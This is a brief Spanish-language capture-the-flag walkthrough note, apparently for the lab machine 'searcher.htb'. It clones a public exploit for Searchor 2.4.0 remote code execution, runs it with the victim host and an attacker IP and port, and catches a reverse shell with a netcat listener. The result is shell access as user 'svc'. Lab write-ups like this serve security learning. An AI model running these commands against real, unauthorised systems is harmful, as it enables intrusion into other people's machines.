#searchor240 

-----

Usamos el repositorio https://github.com/twisted007/Searchor_2.4.0_RCE_Python

-----
Vemos al final de la pagina que esta corriendo searchor 2.4.0
![[Busqueda13.png]]

Asi que con [[git clone]] vamos a usar ``git clone https://github.com/twisted007/Searchor_2.4.0_RCE_Python`` para descargar el repositorio, luego con [[cd]] usamos `cd Searchor_2.4.0_RCE_Python` para entrar a la carpeta y ejecutamos el exploit `python3 searchor-2_4_0_RCE.py searcher.htb 10.10.16.84 443`
En los parametros vamos a colocar la pagina web victima y luego la ip/puerto donde vamos a estar en escucha con [[nc -nlvp 443]] para recibir la [[Reverse shell]]



![[Busqueda14.png]]

![[Busqueda15.png]]
Ya estamos dentro de la maquina victima como el usuario *svc*
